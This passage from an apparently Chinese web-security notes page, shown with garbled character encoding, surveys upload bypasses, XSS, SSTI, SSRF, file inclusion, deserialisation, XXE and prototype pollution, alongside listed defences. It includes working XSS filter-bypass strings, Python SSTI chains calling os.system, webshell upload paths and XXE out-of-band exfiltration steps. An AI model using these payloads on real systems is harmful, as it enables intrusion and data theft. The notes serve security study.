å‘ä¸€ä¸ªpostæ•°æ®åŒ… ä¸”åˆ©ç”¨CRLFå®ç°ä»»æ„æ•°æ®åŒ…æ„é€   ä»è€Œæ‰“ssrf</li></ul><h5 id="å†…å®¹åŠå…¶ä»–"><a href="#å†…å®¹åŠå…¶ä»–" class="headerlink" title="å†…å®¹åŠå…¶ä»–"></a>å†…å®¹åŠå…¶ä»–</h5><ul><li>å›¾ç‰‡æ’å…¥è„šæœ¬ é…åˆæ–‡ä»¶åŒ…å«æ¼æ´</li><li>äºŒæ¬¡æ¸²æŸ“ æ¡ä»¶ç«äº‰ é‡å¤ä¸Šä¼ åŒæ—¶è®¿é—® å°è¯•ä¸­æ–­åˆ é™¤æ“ä½œ</li><li>ä¼ªé€ æ–‡ä»¶å¤¹-&gt;æ–‡ä»¶ä¸Šä¼   &#x2F;upload&#x2F;webshell.php&#x2F;.</li></ul><h5 id="ä¸­é—´ä»¶æ¼æ´-æ­å»ºå¹³å°"><a href="#ä¸­é—´ä»¶æ¼æ´-æ­å»ºå¹³å°" class="headerlink" title="ä¸­é—´ä»¶æ¼æ´(æ­å»ºå¹³å°)"></a>ä¸­é—´ä»¶æ¼æ´(æ­å»ºå¹³å°)</h5><p>â€‹<a href="https://www.freebuf.com/articles/web/192063.html">Webä¸­é—´ä»¶å¸¸è§æ¼æ´æ€»ç»“</a></p><ul><li>tomcat  CVE2017-12615</li><li>apache  ä½ç‰ˆæœ¬è§£ææ¼æ´</li><li>nginxè§£ææ¼æ´ (æ— éœ€è„šæœ¬æ ¼å¼ æ­£å¸¸ä¸Šä¼  &#x2F;kobe.png&#x2F;0.php)</li></ul><h5 id="ç¼–è¯‘å™¨æ¼æ´"><a href="#ç¼–è¯‘å™¨æ¼æ´" class="headerlink" title="ç¼–è¯‘å™¨æ¼æ´"></a>ç¼–è¯‘å™¨æ¼æ´</h5><p>â€‹fuckeditor ckeditor ueditor kindeditorâ€¦</p><h4 id="wafç»•è¿‡-1"><a href="#wafç»•è¿‡-1" class="headerlink" title="wafç»•è¿‡"></a>wafç»•è¿‡<a id="upload_waf"></a></h4><h5 id="å‚æ•°å"><a href="#å‚æ•°å" class="headerlink" title="å‚æ•°å"></a>å‚æ•°å</h5><ul><li>Content-Disposition:ä¸€èˆ¬å¯æ›´æ”¹</li><li>name:è¡¨å•å‚æ•°å€¼ï¼Œä¸èƒ½æ›´æ”¹</li><li>filename :æ–‡ä»¶åï¼Œå¯ä»¥æ›´æ”¹</li><li>Content-Type:æ–‡ä»¶MIMEï¼Œè§†æƒ…å†µæ›´æ”¹</li></ul><h5 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h5><ul><li>æ•°æ®æº¢å‡º</li><li>ç¬¦å·å˜å¼‚ <code>&#39; &quot; ;</code></li><li>æ•°æ®æˆªæ–­ <code>%00</code> <code>;</code> <code>æ¢è¡Œ</code></li><li>é‡å¤æ•°æ®</li><li><a href="D:\éªšå·¥å…·\fuzzdb-master">fuzz</a></li></ul><h3 id="XSSè·¨ç«™æ¼æ´"><a href="#XSSè·¨ç«™æ¼æ´" class="headerlink" title="XSSè·¨ç«™æ¼æ´"></a>XSSè·¨ç«™æ¼æ´</h3><ul><li>åˆ†ç±» åå°„å‹ã€å­˜å‚¨å‹ã€DOMå‹</li><li>å¸¸è§æ‰‹æ³• <a href="https://xss.yt/">å¹³å°</a>ã€å·¥å…·ã€ä»£ç åˆ†æ</li><li>âš ä¹Ÿå¯èƒ½ä¸ºssti æ³¨æ„è¯†åˆ«</li></ul><h5 id="å·¥å…·ä½¿ç”¨"><a href="#å·¥å…·ä½¿ç”¨" class="headerlink" title="å·¥å…·ä½¿ç”¨"></a>å·¥å…·ä½¿ç”¨</h5><ul><li>beef kaliè™šæ‹Ÿæœºè£…é… </li><li><a href="D:\éªšå·¥å…·\Postman\Postman.exe">postman</a> æ”¹å¤´å‘é€æ•°æ®åŒ…</li><li>burpé…åˆfuzzå­—å…¸</li><li>xssstrike.py</li></ul><h5 id="httponlyç»•è¿‡-åˆ©ç”¨å¹³å°"><a href="#httponlyç»•è¿‡-åˆ©ç”¨å¹³å°" class="headerlink" title="httponlyç»•è¿‡(åˆ©ç”¨å¹³å°)"></a>httponlyç»•è¿‡(åˆ©ç”¨å¹³å°)</h5><ul><li>è¡¨å•åŠ«æŒ</li><li>è¯»å–æµè§ˆå™¨ä¿å­˜ä¿¡æ¯</li></ul><h5 id="æ‰‹å·¥æ³¨å…¥"><a href="#æ‰‹å·¥æ³¨å…¥" class="headerlink" title="æ‰‹å·¥æ³¨å…¥"></a>æ‰‹å·¥æ³¨å…¥</h5><ul><li><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p></li><li><p>é—­åˆæ ‡ç­¾ æ’å…¥aæ ‡ç­¾ ä½¿ç”¨å†…ç½®å‡½æ•°(onclick) å¤§å°å†™é˜²åŒ¹é… åŒå†™ ç¼–ç  æ³¨é‡Šå¹²æ‰°å­—ç¬¦</p></li></ul><h5 id="wafç»•è¿‡-2"><a href="#wafç»•è¿‡-2" class="headerlink" title="wafç»•è¿‡"></a>wafç»•è¿‡<a id="xss_bypass"></a></h5><ul><li>ç¡®å®šæ˜¯ä¸æ˜¯ssti</li><li>å»é™¤å³æ‹¬å· å¹¶å¯¹é“¾æ¥åŠ â€™â€™ <code>&lt;script src=&#39;a.com/sdfs&#39;</code></li><li>ç‰¹æ®Šç¬¦å·å¹²æ‰° <code>&lt;script src=&#39;a.com/sdfs&#39;#&gt; </code></li><li>æ ‡ç­¾æ›´æ¢ <code>&lt;a /href=&quot;a.com/sdfs&quot;#&gt;a</code> <code>&lt;img src=&#39;&#39; onerrer=&#39;a.com/sdfs&#39;&gt;</code> </li><li>ä¸‰é‡urlç¼–ç ç»•è¿‡ç¬¦å·ç¼–ç </li><li>æ›´æ¢æäº¤æ–¹å¼  unicodeç¼–ç </li><li>fuzz [ç½‘ç«™][<a href="http://www.xssfuzzer.com/fuzzer.html]">www.xssfuzzer.com/fuzzer.html]</a></li></ul><h5 id="å®‰å…¨ä¿®å¤"><a href="#å®‰å…¨ä¿®å¤" class="headerlink" title="å®‰å…¨ä¿®å¤"></a>å®‰å…¨ä¿®å¤</h5><ul><li>httponly</li><li>è¾“å…¥è¿‡æ»¤</li><li>è¾“å‡ºè¿‡æ»¤</li></ul><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><h5 id="å‡ºç°ä½ç½®"><a href="#å‡ºç°ä½ç½®" class="headerlink" title="å‡ºç°ä½ç½®"></a>å‡ºç°ä½ç½®</h5><ul><li>æœ‰xssçš„åœ°æ–¹ï¼Œå°è¯•æ‰§è¡Œè¡¨è¾¾å¼æˆ–è®¡ç®—å¼ï¼Œèƒ½ç»™å‡ºç»“æœ</li></ul><h5 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h5><ul><li>æ¨¡æ¿æ³¨å…¥ï¼Œåˆ©ç”¨webæ¨¡æ¿å¦‚jinja2,tomado,Djangoæ¥å¤„ç†ç½‘é¡µäº¤äº’ï¼Œç”¨æˆ·çš„è¾“å…¥å¯ä»¥ç›´æ¥æ·»åŠ åˆ°é¡µé¢å†…å®¹</li></ul><h5 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><ul><li><p>phpä¸­ä¸€èˆ¬å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤</p></li><li><p>pythonä¸­æ„é€ é“¾ï¼Œä¸€èˆ¬ç”± <code>&quot;&quot;.__class__</code> èµ·æ‰‹ï¼Œä¸æ–­å¯»æ‰¾çˆ¶ç±»æˆ–å­ç±»æ¥å®ç°æ–‡ä»¶è¯»å†™ï¼Œæœ€åçš„é“¾ä¸€èˆ¬å¦‚ä¸‹æ‰€ç¤º</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sqf">().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">68</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">73</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">68</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">73</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure></li></ul><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><ul><li>è¯·æ±‚ä¼ªé€ </li><li>æŠ“æ•°æ®åŒ…æµ‹è¯•</li><li>ä¼ªé€ æœåŠ¡å™¨ç‚¹å‡» æ‰§è¡Œjsè„šæœ¬</li><li>burpç”Ÿæˆpoc</li></ul><h5 id="é˜²æŠ¤"><a href="#é˜²æŠ¤" class="headerlink" title="é˜²æŠ¤"></a>é˜²æŠ¤</h5><ul><li>éšæœºtoken</li><li>åŒæºç­–ç•¥referer</li></ul><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><ul><li>é€šè¿‡ç½‘ç«™æœåŠ¡å™¨åšè·³æ¿è¯·æ±‚å†…ç½‘åœ°å€</li></ul><h5 id="å‡ºç°ç‚¹"><a href="#å‡ºç°ç‚¹" class="headerlink" title="å‡ºç°ç‚¹"></a>å‡ºç°ç‚¹</h5><ul><li>åˆ†äº«ï¼šé€šè¿‡URLåœ°å€åˆ†äº«ç½‘é¡µå†…å®¹</li><li>è½¬ç æœåŠ¡ï¼ˆé€šè¿‡URLåœ°å€æŠŠåŸåœ°å€çš„ç½‘é¡µå†…å®¹è°ƒä¼˜ï¼Œä½¿å…¶é€‚åˆæ‰‹æœºå±å¹•çš„æµè§ˆï¼‰</li><li>åœ¨çº¿ç¿»è¯‘</li><li>å›¾ç‰‡åŠ è½½ä¸ä¸‹è½½ï¼šé€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡</li><li>å›¾ç‰‡ã€æ–‡ç« æ”¶è—åŠŸèƒ½</li><li>æœªå…¬å¼€çš„apiå®ç°åŠè°ƒç”¨URLçš„åŠŸèƒ½</li><li>ä»URLå…³é”®å­—ä¸­å¯»æ‰¾</li></ul><h5 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h5><ul><li>å¯ä»¥å¯¹å¤–ç½‘ã€å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼ŒæŸäº›æƒ…å†µä¸‹ç«¯å£çš„Bannerä¼šå›æ˜¾å‡ºæ¥ï¼ˆæ¯”å¦‚3306çš„ï¼‰ï¼›</li><li>æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„æœ‰æ¼æ´ç¨‹åºï¼ˆæ¯”å¦‚æº¢å‡ºï¼‰ï¼›</li><li>å¯ä»¥å¯¹å†…ç½‘Webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼ŒåŸç†æ˜¯é€šè¿‡è¯·æ±‚é»˜è®¤çš„æ–‡ä»¶å¾—åˆ°ç‰¹å®šçš„æŒ‡çº¹ï¼›</li><li>æ”»å‡»å†…ç½‘æˆ–å¤–ç½‘æœ‰æ¼æ´çš„Webåº”ç”¨ï¼›</li><li>ä½¿ç”¨fileï¼š&#x2F;&#x2F;&#x2F;åè®®è¯»å–æœ¬åœ°æ–‡ä»¶(æˆ–å…¶ä»–åè®®ï¼‰</li></ul><h3 id="RCEä»£ç åŠç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#RCEä»£ç åŠç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="RCEä»£ç åŠç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ¼æ´"></a>RCEä»£ç åŠç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæ¼æ´</h3><h5 id="åˆ¤æ–­ç³»ç»Ÿ"><a href="#åˆ¤æ–­ç³»ç»Ÿ" class="headerlink" title="åˆ¤æ–­ç³»ç»Ÿ"></a>åˆ¤æ–­ç³»ç»Ÿ</h5><ul><li>linux</li><li>windows</li></ul><h5 id="å¯èƒ½äº§ç”Ÿç‚¹"><a href="#å¯èƒ½äº§ç”Ÿç‚¹" class="headerlink" title="å¯èƒ½äº§ç”Ÿç‚¹"></a>å¯èƒ½äº§ç”Ÿç‚¹</h5><ul><li>webæºç </li><li>ä¸­é—´ä»¶</li><li>å…¶ä»–ç¯å¢ƒ</li></ul><h5 id="æ£€æµ‹"><a href="#æ£€æµ‹" class="headerlink" title="æ£€æµ‹"></a>æ£€æµ‹</h5><ul><li>ç™½ç›’ ã€ä»£ç å®¡è®¡ã€‘</li><li>é»‘ç›’ ã€æ¼æ‰«å·¥å…· å…¬å¼€æ¼æ´ æ‰‹å·¥çœ‹å‚æ•°æˆ–åŠŸèƒ½ç‚¹ã€‘</li></ul><h5 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h5><ul><li>waf</li><li>æ•æ„Ÿå‡½æ•°ç¦ç”¨</li><li>å˜é‡è¿‡æ»¤</li></ul><h3 id="æ–‡ä»¶æ“ä½œ"><a href="#æ–‡ä»¶æ“ä½œ" class="headerlink" title="æ–‡ä»¶æ“ä½œ"></a>æ–‡ä»¶æ“ä½œ</h3><h4 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«<a id="æ–‡ä»¶åŒ…å«æ¼æ´"></a></h4><h5 id="æœ¬åœ°åŒ…å«"><a href="#æœ¬åœ°åŒ…å«" class="headerlink" title="æœ¬åœ°åŒ…å«"></a>æœ¬åœ°åŒ…å«</h5><ul><li>ç›´æ¥åŒ…å«</li><li>åç¼€æˆªæ–­%00</li><li>åƒåœ¾æ•°æ®æˆªæ–­&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.</li><li>å¯ç»“åˆæ–‡ä»¶ä¸Šä¼ </li><li>âš filteré“¾å®ç°rce</li></ul><h5 id="è¿œç¨‹åŒ…å«"><a href="#è¿œç¨‹åŒ…å«" class="headerlink" title="è¿œç¨‹åŒ…å«"></a>è¿œç¨‹åŒ…å«</h5><ul><li>ç›´æ¥åœ¨è‡ªå·±ç½‘ç«™æ”¾åé—¨æ–‡ä»¶ -&gt; è¿œç¨‹åŒ…å«åé—¨æ–‡ä»¶ -&gt; èœåˆ€ èšå‰‘é“¾æ¥</li><li>æˆªæ–­</li></ul><h5 id="ä¼ªåè®®æµåŒ…å«"><a href="#ä¼ªåè®®æµåŒ…å«" class="headerlink" title="ä¼ªåè®®æµåŒ…å«"></a><a href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE">ä¼ªåè®®æµåŒ…å«</a></h5><h5 id="é»‘ç›’æµ‹è¯•æ€è·¯"><a href="#é»‘ç›’æµ‹è¯•æ€è·¯" class="headerlink" title="é»‘ç›’æµ‹è¯•æ€è·¯"></a>é»‘ç›’æµ‹è¯•æ€è·¯</h5><ul><li>cmsæ¼æ´&#x2F;æºç åˆ†æ</li><li>æ¼æ‰«å·¥å…·</li></ul><h4 id="æ–‡ä»¶ä¸‹è½½"><a href="#æ–‡ä»¶ä¸‹è½½" class="headerlink" title="æ–‡ä»¶ä¸‹è½½"></a>æ–‡ä»¶ä¸‹è½½</h4><h5 id="æ‰¾æ¼æ´"><a href="#æ‰¾æ¼æ´" class="headerlink" title="æ‰¾æ¼æ´"></a>æ‰¾æ¼æ´</h5><ul><li>å‚æ•°å€¼</li><li>åŠŸèƒ½ç‚¹</li><li>æ¼æ‰«å·¥å…·</li></ul><h5 id="å¾—åˆ°ç›®å½•"><a href="#å¾—åˆ°ç›®å½•" class="headerlink" title="å¾—åˆ°ç›®å½•"></a>å¾—åˆ°ç›®å½•</h5><ul><li>ç›®å½•æ‰«æå·¥å…·</li><li>æ ¹æ®å¯è§æ–‡ä»¶åˆ†æ</li></ul><h5 id="é˜²è¿‡æ»¤"><a href="#é˜²è¿‡æ»¤" class="headerlink" title="é˜²è¿‡æ»¤"></a>é˜²è¿‡æ»¤</h5><ul><li>..&#x2F;..&#x2F;</li><li>%20 %00</li></ul><h3 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h3><h5 id="nginxç›®å½•ç©¿è¶Š"><a href="#nginxç›®å½•ç©¿è¶Š" class="headerlink" title="nginxç›®å½•ç©¿è¶Š"></a>nginxç›®å½•ç©¿è¶Š</h5><ul><li>é…ç½®åˆ«åæ—¶å‡ºç°ç–å¿½</li><li>å¦‚é…ç½®<code>/etc/download/</code>çš„åˆ«åä¸º<code>/file/ -&gt; /file</code>å¿˜è®°&#x2F;å¯¼è‡´ç›®å½•ç©¿è¶Š</li><li>åˆ©ç”¨ <code>/file../</code>å¯è·³è½¬åˆ°ä¸Šå±‚ç›®å½• <code>/etc/download/../</code> å³ <code>/etc</code></li></ul><h5 id="java-WEB"><a href="#java-WEB" class="headerlink" title="java WEB"></a>java WEB</h5><ul><li>webinf&#x2F;web.xml å­˜æ”¾ä¿¡æ¯</li><li>å‚æ•°ç”¨POSTä¼ é€’</li><li><a href="https://blog.csdn.net/Mrs_H/article/details/119576821">WEB-INF&#x2F;web.xmlæ³„éœ²æ¼æ´åŠå…¶åˆ©ç”¨</a></li></ul><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><ul><li>ä¸€èˆ¬å€ŸåŠ©ç±»çš„æŸäº›æ–¹æ³•è¾…åŠ©å®ç°</li><li>ç»“åˆRCE(ä»£ç æ‰§è¡Œ)ç­‰æ¼æ´ä½¿ç”¨</li></ul><h5 id="phpååºåˆ—åŒ–"><a href="#phpååºåˆ—åŒ–" class="headerlink" title="phpååºåˆ—åŒ–"></a>phpååºåˆ—åŒ–</h5><ul><li>å°†å¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²(åºåˆ—åŒ–)<code>serialize()</code></li><li>ååºåˆ—åŒ–<code>unserialize()</code></li><li>ç±»å¯¹è±¡åºåˆ—åŒ–å†ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨è‹é†’å‡½æ•°<code>__wakeup()</code></li><li>åˆ›å»ºç±»æ—¶è°ƒç”¨æ„é€ å‡½æ•°<code>__construct()</code></li><li>ç±»å¯¹è±¡è¢«echoæˆ–å½“ä½œå­—ç¬¦ä¸²æ“ä½œæ—¶ä¼šè°ƒç”¨<code>__toString()</code></li></ul><h5 id="popé“¾"><a href="#popé“¾" class="headerlink" title="popé“¾"></a>popé“¾</h5><ul><li>æœ‰å¤šä¸ªç±»ï¼Œä»–ä»¬çš„é­”æœ¯æ–¹æ³•å¯ä»¥èµ·åˆ°ä¸åŒä½œç”¨ï¼Œæ­¤æ—¶éœ€è¦åˆ†æå…¥å£å’Œå‡ºå£å‡½æ•°ï¼Œä¸æ–­åœ°æ„å»ºå¯¹è±¡ï¼Œå¯¹è±¡çš„å±æ€§äº’ä¸ºå…¶ä»–å¯¹è±¡ï¼Œä»¥æ­¤æ¥è¾¾åˆ°é“¾å¼è°ƒç”¨çš„ç»“æœ</li></ul><h5 id="pharååºåˆ—åŒ–"><a href="#pharååºåˆ—åŒ–" class="headerlink" title="pharååºåˆ—åŒ–"></a>pharååºåˆ—åŒ–</h5><ul><li>å¦‚æœå‡½æ•°é‡Œæ²¡æœ‰ <code>unserialize</code> å‡½æ•°ï¼Œä½†æ˜¯åˆå­˜åœ¨ååºåˆ—åŒ–æ¼æ´æˆ–å¯ä»¥æ„é€ popé“¾ï¼Œå°±å¯ä»¥å°è¯•åˆ©ç”¨pharæ¥è¿›è¡Œååºåˆ—åŒ–ï¼ŒåŸç†ä¸ºpharæ ¼å¼çš„å‹ç¼©åŒ…æ•°æ®å†…å®¹ä¸ºåºåˆ—åŒ–æ ¼å¼å­˜å‚¨ï¼Œåœ¨åˆ©ç”¨æŸäº›å‡½æ•°è°ƒç”¨pharæ ¼å¼çš„æ–‡ä»¶æ—¶ï¼Œä¼šè‡ªåŠ¨è¿›è¡Œååºåˆ—åŒ–</li></ul><h5 id="phpååºåˆ—åŒ–å­—èŠ‚é€ƒé€¸"><a href="#phpååºåˆ—åŒ–å­—èŠ‚é€ƒé€¸" class="headerlink" title="phpååºåˆ—åŒ–å­—èŠ‚é€ƒé€¸"></a>phpååºåˆ—åŒ–å­—èŠ‚é€ƒé€¸</h5><ul><li>å¸¸å­˜åœ¨äºå­˜åœ¨è¿‡æ»¤çš„æƒ…å†µï¼Œç”±äºåºåˆ—åŒ–åçš„æ•°æ®å†…å®¹ä¸­å€¼çš„é•¿åº¦æ˜¯ç”±æ•°å­—å”¯ä¸€ç¡®å®šçš„ï¼Œï¼Œé‚£ä¹ˆè¿›è¡Œé•¿åº¦ä¸å¯¹ç­‰çš„è¿‡æ»¤æ›¿æ¢åï¼Œä¼šåœ¨åœ¨åŸæ¥çš„åºåˆ—ä¼ ä¸­æˆªå–å‡ºæ–°çš„ä¸²ï¼Œä»è€Œå®ç°æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„æŸäº›ç»“æœ(æ¯”å¦‚æ§åˆ¶ä¸€äº›æ— æ³•æ§åˆ¶çš„å€¼)</li></ul><h5 id="javaååºåˆ—åŒ–"><a href="#javaååºåˆ—åŒ–" class="headerlink" title="javaååºåˆ—åŒ–"></a>javaååºåˆ—åŒ–</h5><ul><li><p>å·¥å…·<code>ysoserial</code></p><h6 id="æ£€æµ‹-1"><a href="#æ£€æµ‹-1" class="headerlink" title="æ£€æµ‹"></a>æ£€æµ‹</h6><ul><li>é»‘ç›’çœ‹å‚æ•° ä»¥<code>rO0AB(base64) æˆ– aced(base16)</code> å¼€å¤´</li><li>ç™½ç›’æ‰¾<code>readobject() writeobject</code></li></ul></li><li><p>åˆ©ç”¨ åå¼¹shell RCE å¼¹è®¡ç®—å™¨(bushi)</p></li></ul><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p><code>xml external entity injection </code>xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´</p><h4 id="å±å®³"><a href="#å±å®³" class="headerlink" title="å±å®³"></a>å±å®³</h4><ul><li>æ–‡ä»¶è¯»å–</li><li>ä»£ç æ‰§è¡Œ</li><li>å†…ç½‘æ”»å‡»</li><li>DOSæ”»å‡»</li></ul><h4 id="æ£€æµ‹-2"><a href="#æ£€æµ‹-2" class="headerlink" title="æ£€æµ‹"></a>æ£€æµ‹</h4><h5 id="ç™½ç›’"><a href="#ç™½ç›’" class="headerlink" title="ç™½ç›’"></a>ç™½ç›’</h5><ul><li>å‡½æ•°åŠå¯æ§å˜é‡æŸ¥æ‰¾</li><li>ä¼ è¾“å’Œå‚¨å­˜æ•°æ®æ ¼å¼ç±»å‹</li></ul><h5 id="é»‘ç›’"><a href="#é»‘ç›’" class="headerlink" title="é»‘ç›’"></a>é»‘ç›’</h5><ul><li>æ›´æ”¹content-Type ä¸º application&#x2F;xml çœ‹æ˜¯å¦æ¥å—</li></ul><h4 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><h5 id="æœ‰å›æ˜¾"><a href="#æœ‰å›æ˜¾" class="headerlink" title="æœ‰å›æ˜¾"></a>æœ‰å›æ˜¾</h5><ul><li>åè®® <code>http file</code></li><li>å¼•å…¥å¤–éƒ¨å®ä½“</li></ul><h5 id="æ— å›æ˜¾"><a href="#æ— å›æ˜¾" class="headerlink" title="æ— å›æ˜¾"></a>æ— å›æ˜¾</h5><ul><li>è¯»å–æŒ‡å®šå†…å®¹ base64ç¼–ç å èµ‹å€¼ç»™<code>file</code></li><li>è®¿é—®è¿œç¨‹åœ°å€çš„ <code>test.dtd</code>æ–‡ä»¶</li><li>test.dtd å†…å†™æœ‰ å¸¦å‚æ•°<code>?data=%file</code> è®¿é—®è‡ªå·±çš„ç½‘ç«™</li><li>æŸ¥çœ‹ç½‘ç«™çš„æ—¥å¿—å¾—åˆ°  file å†…å®¹</li></ul><h4 id="å®æˆ˜-vulnhub-xxe"><a href="#å®æˆ˜-vulnhub-xxe" class="headerlink" title="å®æˆ˜(vulnhub&#x2F;xxe)"></a>å®æˆ˜(vulnhub&#x2F;xxe)</h4><ul><li>ä¸‹è½½é•œåƒæ–‡ä»¶</li><li>æ‰“å¼€å‘ç°éœ€è¦ç™»é™†å¯†ç </li><li>ç”¨ä¸»æœºå¼€nmapæ‰«åˆ°80ç«¯å£</li><li>è¿›å»çœ‹åˆ°ubuntuæ¬¢è¿ç•Œé¢</li><li>dirsearchæ‰«ç›®å½•å¾—åˆ°rebots.txt</li><li>rebots.txté‡Œçœ‹åˆ°&#x2F;xxeç›®å½•</li><li>è®¿é—®&#x2F;xxe çœ‹åˆ°ç™»å½•æ¡†</li><li>ä»»æ„æ–‡ä»¶è¯»å–è¯»åˆ°&#x2F;xxe&#x2F;admin.phpæºç </li><li>ä»æºç ä¸­å¾—åˆ°è´¦å·å¯†ç ç™»å½•</li><li>å¾—åˆ°flagç½‘å€(å‡) æ‰“ä¸å¼€</li><li>ä»»æ„æ–‡ä»¶è¯»å–å‡çš„flagç½‘å€å¾—åˆ°base32å­—ç¬¦ä¸²</li><li>base32 base64è§£ç å¾—åˆ°çœŸæ­£çš„flagåœ°å€ &#x2F;etc&#x2F;.flag</li><li>base64è§£ç  å¾—åˆ°ä¸€ä¸²æ··æ·†è¿‡çš„phpæºç </li><li>åœ¨çº¿è¿è¡Œ æŠ¥é”™ å¾—åˆ°flag</li></ul><h4 id="é˜²å¾¡-1"><a href="#é˜²å¾¡-1" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h4><ul><li>ç¦ç”¨å¤–éƒ¨å®ä½“</li><li>è¿‡æ»¤ç”¨æˆ·æäº¤çš„xmlæ•°æ®</li><li>è£…waf</li></ul><h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><h4 id="åŸå‹é“¾æ±¡æŸ“"><a href="#åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“"></a>åŸå‹é“¾æ±¡æŸ“</h4><h5 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h5><ul><li>javascriptç±»&#x2F;å¯¹è±¡å­˜åœ¨ä¸€ä¸ª<strong>åŸå‹å¯¹è±¡</strong>ï¼Œæ„é€ å‡½æ•°çš„ <code>prototype</code> å°±ç­‰äºå®ä¾‹åŒ–å¯¹è±¡çš„ <code>__proto__</code> ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¿®æ”¹ä¸€ä¸ªå¯¹è±¡çš„ <code>__proto__</code> çš„å±æ€§ï¼Œå°±ä¼šä¿®æ”¹è¿™ä¸ªå¯¹è±¡çš„åŸå‹å¯¹è±¡çš„å±æ€§</li><li>javascriptå¯¹è±¡çš„å±æ€§å…·æœ‰<strong>å‘ä¸Šç»§æ‰¿</strong>çš„ç‰¹æ€§ï¼Œå¦‚æœä¸€ä¸ªå¯¹è±¡å¹¶ä¸å…·æœ‰æŸä¸ªå±æ€§ï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨è¿™ä¸ªå±æ€§çš„æ—¶å€™ä¾¿ä¼šå‘<strong>åŸå‹å¯¹è±¡</strong>çš„å±æ€§å»å¯»æ‰¾ï¼Œ<strong>ä¾æ¬¡å¾€ä¸Š</strong>ç›´åˆ°æ‰¾åˆ°å±æ€§æˆ–null</li><li>åˆ©ç”¨ä»¥ä¸Šä¸¤ç‚¹ï¼Œä¾¿å¯ä»¥å®ç°ä»¥ä¸‹åŠŸèƒ½ï¼šä¿®æ”¹ a å¯¹è±¡çš„<strong>åŸå‹å¯¹è±¡</strong>ï¼Œä½¿ b 